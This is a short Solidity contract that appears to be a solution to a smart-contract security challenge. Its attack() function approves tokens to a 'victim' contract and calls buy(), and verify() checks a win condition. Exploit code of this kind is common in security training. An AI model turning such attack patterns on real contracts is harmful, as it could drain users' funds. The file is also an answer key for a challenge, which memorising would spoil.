// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "hardhat/console.sol";

interface IMayaVictim {
    function buy() external;

    function token() external returns (address);

    function hunter() external view returns (string memory);
}

interface IMERC20Victim {
    function getTokens() external;

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);
}

contract MayaSolution {
    IMayaVictim public maya;
    IMERC20Victim public merc20;

    constructor(address victim_) payable {
        maya = IMayaVictim(victim_);
        merc20 = IMERC20Victim(maya.token());
    }

    function attack() external {
        //merc20.getTokens();
        //uint256 balance = merc20.balanceOf(address(this));
        merc20.approve(address(maya), 500000000000000000000);
        maya.buy();
    }

    function verify() external view returns (string memory) {
        return maya.hunter();
    }
}
